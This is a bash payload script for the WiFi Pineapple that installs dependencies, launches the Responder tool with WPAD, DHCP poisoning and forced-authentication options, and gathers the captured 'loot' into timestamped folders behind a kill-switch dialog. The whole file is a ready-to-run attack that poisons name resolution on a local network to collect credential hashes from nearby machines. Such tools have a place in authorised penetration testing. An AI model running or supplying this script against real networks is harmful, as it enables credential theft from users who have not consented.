#!/bin/bash
# Title: Responder Payload for WiFi Pineapple
# Author: Hackazillarex
# Description: Runs Responder with logging and a kill switch.
# Version: 1.0

############################
# Configuration
############################
RESPONDER_DIR="/root/payloads/user/exfiltration/Responder_Payload/responder"
LOOTDIR="/root/loot/responder"
SESSION_DIR="$LOOTDIR/session_$(date +%Y%m%d_%H%M%S)"
INTERFACE="wlan0cli"

############################
# Setup directories
############################
mkdir -p "$SESSION_DIR"

############################
# Wait for opkg
############################
wait_for_opkg() {
    while pgrep -x opkg >/dev/null; do
        sleep 2
    done
}

############################
# Dependencies
############################
LOG blue "Checking and installing dependencies..."

for pkg in python3 python3-netifaces git; do
    if ! opkg list-installed | grep -q "^$pkg "; then
        LOG blue "Installing $pkg..."
        opkg update
        opkg install "$pkg"
        wait_for_opkg
    else
        LOG green "$pkg already installed."
    fi
done

############################
# Check for Responder
############################
if [ ! -d "$RESPONDER_DIR" ] || [ ! -f "$RESPONDER_DIR/Responder.py" ]; then
    LOG red "Responder not found!"
    LOG red "Please place the included Responder tool in /root/payloads/user/exfiltration/Responder_Payload and try again"
    exit 1
else
    LOG green "Responder already present."
fi

cd "$RESPONDER_DIR" || exit 1


############################
# Clean old logs
############################
rm -rf "$RESPONDER_DIR/logs"
mkdir -p "$RESPONDER_DIR/logs"

############################
# Start Responder
############################
LOG blue "Starting Responder on $INTERFACE..."

python3 Responder.py -I "$INTERFACE" -w -d -F \
    > "$SESSION_DIR/responder_console.log" 2>&1 &

RESPONDER_PID=$!
LOG green "Responder running (PID $RESPONDER_PID)"

############################
# Kill switch
############################
resp=$(CONFIRMATION_DIALOG "Click YES to stop Responder and collect loot.")

if [ "$resp" = "1" ]; then
    LOG blue "Stopping Responder..."
    kill "$RESPONDER_PID" 2>/dev/null
    sleep 2
    kill -9 "$RESPONDER_PID" 2>/dev/null
    LOG green "Responder stopped."

    ############################
    # Collect actual loot
    ############################
    if [ -d "$RESPONDER_DIR/logs" ]; then
        cp -r "$RESPONDER_DIR/logs"/* "$SESSION_DIR"/ 2>/dev/null
        LOG green "Responder logs saved to $SESSION_DIR"
    else
        LOG red "Responder logs directory missing!"
    fi
else
    LOG yellow "Responder still running (PID $RESPONDER_PID)"
fi

exit 0
